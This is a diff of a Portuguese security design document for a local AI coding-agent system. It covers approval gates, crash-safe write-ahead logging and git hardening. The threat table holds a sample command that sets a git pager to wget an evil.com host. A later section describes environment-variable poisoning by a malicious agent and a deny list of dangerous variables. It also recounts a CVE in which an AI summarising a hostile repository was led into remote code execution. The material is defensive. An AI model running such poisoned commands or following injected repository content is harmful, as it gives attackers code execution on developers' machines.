@@ -1,6 +1,7 @@
 # GreenForge Agent — 05: Governança e Segurança
 
 > **Status:** ✅ | **Versão:** 2.3 | **Data:** 2026-05-15
+> **Referências:** CVE-2025-68143/68144/68145 (mcp-server-git), OWASP Path Traversal, TAILOR (ASE'22), SQLite WAL Docs, Write-Ahead Log (Kleppmann, DDIA), Environment Poisoning (CVE-2026-22708)
 
 ### 📋 Changelog v2.2 → v2.3 — Hardening Crítico de Segurança Terminal
 | Vuln | Correção |
@@ -26,6 +27,7 @@
 | **T-06** | Execução de código gerado sem aprovação | Debate converge e merge acontece automaticamente | Gate 1 e Gate 2 são bloqueadores síncronos via `Promise` pendente; `APPROVAL_MODE=yolo` deve ser explícito | Com `APPROVAL_MODE=manual`: qualquer merge sem `HITL_DECISION {APPROVE}` → `Error` |
 | **T-07** | Exaustão de quota da API por loop de agentes | AutoFixLimiter não funcionando | `AutoFixAttempt.attemptNumber <= 3` validado antes de cada retry; falha na 4ª → HITL Gate | Teste: forçar 4 erros → Gate exibido na 4ª tentativa, sem 5ª chamada LLM |
 | **T-08** | Custo excessivo por chamada 1M tokens sem conhecimento do usuário | `LazyContextLoader` eleva budget silenciosamente | `CONTEXT_EXTENDED_BUDGET` só é usado após `HITL_GATE {gateType: 'COST_APPROVAL'}` aprovado | Teste: `contextBudget=1_000_000` sem gate → `Error: ExtendedBudgetRequiresApproval` |
+| **T-09** | Environment Poisoning via variáveis injetadas por agente malicioso | Agente escreve `PAGER=malicious_binary` antes de `git log` permitido | `sanitizeEnv()` destrói todas as vars fora da allowlist ANTES de cada exec; `DANGEROUS_ENV_VARS` inclui `GIT_EXEC_PATH`, `GIT_PAGER`, `PAGER`, `GIT_SSH_COMMAND` | Teste: `GIT_PAGER=wget http://evil.com git log` → var removida, wget nunca invocado |
 
 ### Fluxo de Aprovação WebSocket (Anti Race Condition)
 
@@ -51,9 +53,23 @@ sequenceDiagram
 
 ---
 
+## 1. Modelo de Segurança do MVP
 
+### 1.1 Justificativa Teórica: WAL Intent Log como Contrato de Atomicidade (v2.3)
 
-O GreenForge v2.0 opera no modelo **single-user, localhost, sem autenticação**.
+> **Fonte:** Pesquisa Técnica Profunda v2.3, Ponto 1. Integrado aqui como fundamentação arquitetural para o contrato de resiliência.
+
+O mecanismo do **BootReconciler** não é uma decisão de implementação arbitária — é a aplicação direta do princípio teórico de Write-Ahead Logging formalizado pela ciência de banco de dados:
+
+**O princípio WAL:** Em computação, o Write-Ahead Logging (WAL) é uma família de técnicas para prover atomicidade e durabilidade em sistemas de banco de dados. Um write-ahead log é uma estrutura auxiliar residente em disco, **append-only**, usada para recuperação de crash e transação. As mudanças são primeiro registradas no log, que **deve ser escrito em armazenamento estável**, antes de as mudanças serem escritas no banco.
+
+**Por que o SQLite sozinho não resolve:** Transações que envolvem mudanças contra múH ltiplos databases `ATTACH`ed são atômicas para cada database individual, **mas não são atômicas através de todos os databases como conjunto**. O GreenForge opera sobre dois sistemas heterogêneos (Git filesystem + SQLite DB) que não compartilham um mecanismo de commit unitário. Logo, o Intent Log no filesystem é **obrigatório** — não é otimização.
+
+**Mecanismo de sobrevivência ao SIGKILL (via rename atômico):** O OS é livre para reordenar operações em disco, e muitas operações de arquivo não são atômicas. A técnica padrão é: escrever em arquivo temporário e então **renomeá-lo** para o local final — o `rename(2)` POSIX é atômico e indivisível mesmo sob SIGKILL. O `fsync()` antes do rename garante que os dados chegaram ao disco antes da troca.
+
+**Custo e trade-off documentado:** O `fsync()` é uma operação cara. Para o GreenForge, isso adiciona ~5-10ms de latência por checkpoint. A decisão é deliberada: o contrato de resiliência (zero stashes órfãos) vale mais do que a latência.
+
+### 1.2 Premissa de Segurança (MVP Local)
 
 **Premissa de segurança:** Acesso físico ou via rede local à máquina hospedeira implica autorização de uso. O perímetro de segurança é o sistema operacional do usuário, não um formulário de login.
 
@@ -671,6 +687,58 @@ export { executeSecureGit, validateGitCommand };
 
 ---
 
+## 4.4 Environment Poisoning — O Risco Residual Além das Allowlists (v2.3)
+
+> **Fonte:** Pesquisa Técnica Profunda v2.3, Ponto 4 + achado crítico final. Esta é a vulnerabilidade que a pesquisa identificou **além do que o escopo original pedia** e que exige tratamento obrigatório.
+
+### O Problema Fundamental
+
+Controles estáticos como allowlists de comandos seguros **exacerbam este risco** ao validar o que é executado enquanto ignoram o contexto envenenado em que roda — efetivamente agilizando o ataque ao aprovar automaticamente os próprios comandos usados para detonar o payload.
+
+Isso significa: **um wrapper perfeito de allowlist pode ser contornado** se o agente tiver escrito `PAGER=malicious_binary` em um `.env` antes de executar o comando permitido. O `git log` está na allowlist; o binário PAGER não está — mas o git o invoca automaticamente.
+
+Esta attack chain converte comandos benignos aprovados — como `git branch` — em vetores de execução de código arbitrário, explorando shell built-ins como `export`, `typeset` e `declare` para manipular variáveis de ambiente silenciosamente.
+
+### Taxonomia de Variáveis de Ambiente Perigosas para Git
+
+| Variável | Vetor de Ataque | Severidade |
+|---|---|---|
+| `GIT_EXEC_PATH` | Redireciona onde o git busca subcomandos (RCE completo) | 🔴 CRÍTICO |
+| `GIT_PAGER` | Executa pager arbitrário após `git log` (RCE) | 🔴 CRÍTICO |
+| `PAGER` | Fallback do git para pager (RCE via `git log`) | 🔴 CRÍTICO |
+| `GIT_SSH_COMMAND` | Executa comando SSH arbitrário em push/pull | 🔴 CRÍTICO |
+| `GIT_ASKPASS` | Executa programa para obter credenciais | 🟠 ALTO |
+| `GIT_EDITOR` | Executa editor arbitrário em commits interativos | 🟠 ALTO |
+| `GIT_TRACE` / `GIT_TRACE2` | Pode escrever logs em arquivos arbitrários | 🟡 MÉDIO |
+| `GIT_CONFIG_COUNT` | Injeta configurações arbitrárias do git em runtime | 🟠 ALTO |
+| `BASH_ENV` | Executado automaticamente em cada subshell (RCE) | 🔴 CRÍTICO |
+| `LD_PRELOAD` | Injeta biblioteca dinâmica em qualquer exec (privesc) | 🔴 CRÍTICO |
+
+### Por que a Sanitização é Camada Obrigatória
+
+A análise dos CVE-2025-68143/68144/68145 (mcp-server-git) demonstra que um atacante pode alcanzar RCE completo na máquina do desenvolvedor simplesmente pedindo à IA para resumir um repositório malicioso. O exploit encadeia uma falha de path traversal para contornar allowlists, um comando irrestrito para criar repositórios em locais arbitrários, e **argument injection para executar comandos shell** — tudo com o agente como vetor inconsciente.
+
+A defesa canônica (já implementada no `secureGit` acima):
+
+```typescript
+// Aplique ANTES de qualquer exec() de git — sem exceções
+const DANGEROUS_ENV_VARS = [
+  'GIT_EXEC_PATH', 'GIT_PAGER', 'PAGER', 'GIT_EDITOR',
+  'GIT_SSH', 'GIT_SSH_COMMAND', 'GIT_PROXY_COMMAND', 'GIT_ASKPASS',
+  'GIT_CONFIG_COUNT', 'GIT_TERMINAL_PROMPT', 'GIT_TRACE', 'GIT_TRACE2',
+  'BASH_ENV', 'ENV', 'LD_PRELOAD', 'LD_LIBRARY_PATH',
+  'DYLD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'IFS', 'CDPATH',
+];
+
+const sanitizedEnv = { ...process.env };
+for (const envVar of DANGEROUS_ENV_VARS) delete sanitizedEnv[envVar];
+// Passar sanitizedEnv a todo child_process.exec/spawn que interaja com git
+```
+
+> ⚠️ **Regra Absoluta:** A sanitização de variáveis de ambiente é a **última linha de defesa** quando todas as outras (allowlist de subcomandos, validação de path, HMAC) estão corretas. Removê-la cria uma janela de ataque que nenhum outro controle fecha.
+
+---
+
 ## 5. Rollback Pós-Merge
 
 ### 5.1 Mecanismo
@@ -813,24 +881,51 @@ async function auditAgentIntegrity(agentId: string, systemPrompt: string, previo
 - **Audit Trail:** Cada alteração no arquivo gera um diff auditável no banco de dados, registrando o timestamp e o hash anterior/novo.
 - **Failsafe:** Se o parse do novo YAML falhar, o servidor mantém os agentes anteriores em memória e emite um alerta `AGENT_FACTORY_RELOAD_FAILED` via SSE.
 
-### Checklist de Segurança por Perfil (v2.1)
+### Checklist de Imunidade Arquitetural por Perfil (v2.3)
 
-#### Dev Júnior
-- [ ] Usar `APPROVAL_MODE=manual` sempre
-- [ ] Nunca commitar `.env` ou `.greenforge/`
-- [ ] Verificar Red Flags antes de aprovar qualquer Gate
-- [ ] Não desabilitar `SECRET_REDACTION_ENABLED`
+> **Mudança v2.1 → v2.3:** As verificações abaixo são baseadas nos contratos determinísticos do sistema de resiliência v2.3. Cada item é rastreável a um mecanismo implementado e verificável programaticamente. Itens de "boa prática" sem contrato técnico foram removidos.
 
-#### Dev Sênior / Tech Lead
-- [ ] Definir `APPROVAL_MODE` padrão para o projeto (recomendado: `auto_edit`)
-- [ ] Configurar `SANDBOX_MODE=docker` em CI/CD
-- [ ] Revisar `SHELL_ALLOWLIST` e subcomandos permitidos
-- [ ] Monitorar integridade do `AGENTS.md` via `AuditLog`
-- [ ] Configurar `DAILY_BUDGET_USD` compatível com a cota do Google AI Studio
+#### Dev Júnior — Verificações de Corretude de Configuração
 
-#### DevOps / SRE
-- [ ] Validar `AUTHORIZED_WORKTREES_ROOT` e permissões de filesystem
-- [ ] Monitorar `LLMCallLog` para anomalias de custo/latência
-- [ ] Verificar logs do `EventOutbox` para erros de sincronização
-- [ ] Agendar cleanup de `ResourceLease` expirados via cron
-- [ ] Garantir que `SERVER_PORT` não está exposto externamente sem VPN/Auth
+- [ ] **`APPROVAL_MODE=manual`** configurado em `.env.local` (nunca commitar `.env`)
+- [ ] **`GREENFORGE_GATE_SECRET`** definido como string hex de 256-bit (erro de startup se ausente)
+- [ ] **`AUTHORIZED_WORKTREES_ROOT`** aponta para diretório pai dos worktrees (ex: `./worktrees/`)
+- [ ] Ao submeter um gate: se receber `WORKTREE_DIVERGED`, **solicitar novo card** — nunca forçar aprovação
+- [ ] Ao ver `LoopDiagnosis { isLoop: true }` com `INVARIANT_SIDE_EFFECTS`: injetar nova constraint antes de continuar
+- [ ] Confirmar que `db.pragma('journal_mode = WAL')` está ativo: `PRAGMA journal_mode;` → deve retornar `wal`
+
+#### Dev Sênior / Tech Lead — Contratos de Engenharia
+
+- [ ] **Ordem de boot verificada:** `bootReconciler(db)` é a **primeira** chamada pós-abertura do DB, antes de qualquer handler HTTP ou conexão SSE
+- [ ] **WAL dir presente:** `.greenforge/wal/` existe e tem permissão de escrita; arquivos `.tmp` residuais indicam crash prévio
+- [ ] **`secureGit` como único ponto de saída:** nenhum `child_process.exec` ou `simpleGit()` direto chama git; todos passam pelo wrapper com `sanitizeEnv()`
+- [ ] **Validação de `realpath()`:** `AUTHORIZED_WORKTREES_ROOT` resolve para caminho absoluto sem symlinks; testar com `../` no path → `SecurityError: Path traversal`
+- [ ] **HMAC no payload:** `PreExecutionGuard.issueCard()` gera `hmac` com `GREENFORGE_GATE_SECRET`; validar que um card com `hmac` adulterado retorna `HMAC_INVALID`
+- [ ] **CPGLoopDetector instância por agente:** cada `agentId` tem sua própria instância de `CPGLoopDetector`; instâncias compartilhadas causam detecções incorretas entre agentes
+- [ ] **`LOOP_DETECTOR_THRESHOLD`** definido; valor abaixo de `0.85` causa falsos positivos no `CPG_CYCLE`
+
+#### DevOps / SRE — Contratos de Resiliência Operacional
+
+- [ ] **Teste de crash recovery:** `kill -9 <pid>` com checkpoint em fase `GIT_STASH_DONE` → no próximo boot, `bootReconciler` emite `forwardRecovered` para o `txId`; worktree e DB estão sincronizados
+- [ ] **Sem arquivos `.tmp` residuais** em `.greenforge/wal/` após boot limpo; se presentes, indicam falha no `writeIntent()` e são removidos automaticamente pelo `cleanOrphanedTempFiles()`
+- [ ] **Headers de Cross-Origin-Isolation ativos** em produção: `curl -I <server>` retorna `Cross-Origin-Opener-Policy: same-origin` e `Cross-Origin-Embedder-Policy: require-corp`; sem eles, `SharedArrayBuffer` (CodeMirror 6) falha silenciosamente
+- [ ] **`LLMCallLog` monitorado** para anomalias: custo acima de `DAILY_BUDGET_USD` ou latência > 30s indica loop de agente não detectado
+- [ ] **GC de `ResourceLease`:** expirados > 24h são removidos via cron; `AUTHORIZED_WORKTREES_ROOT` não acumula worktrees órfãos
+- [ ] **`SERVER_PORT` não exposto externamente** sem VPN/Auth; o modelo de segurança v2.3 é explicitamente single-user/localhost
+- [ ] **Variáveis de ambiente críticas** — verificação de presença no startup:
+  ```
+  GREENFORGE_GATE_SECRET     ← obrigatória (PreExecutionGuard HMAC)
+  AUTHORIZED_WORKTREES_ROOT  ← obrigatória (path traversal fencing)
+  GEMINI_API_KEY             ← obrigatória (LLM calls)
+  DAILY_BUDGET_USD           ← recomendada (proteção de custo)
+  ```
+
+#### Verificação de Fallback — SharedArrayBuffer Bloqueado pelo Browser
+
+> Quando o browser **não** tem Cross-Origin-Isolation ativo (ex: servidor de desenvolvimento sem os headers), o CodeMirror 6 falha ao inicializar o `ThreadedParser`. A UI deve degradar graciosamente:
+
+- [ ] Editor exibe badge `⚠️ Parser offline — realce de sintaxe desativado` em vez de quebrar
+- [ ] Console registra: `[CodeMirror] SharedArrayBuffer unavailable. Parser disabled. Reason: Cross-Origin-Isolation not active.`
+- [ ] Edição de código **continua funcionando** sem realce de sintaxe (fallback para modo plaintext)
+- [ ] Ao ativar os headers COOP/COEP, F5 no browser restaura o parser sem necessidade de rebuild
+
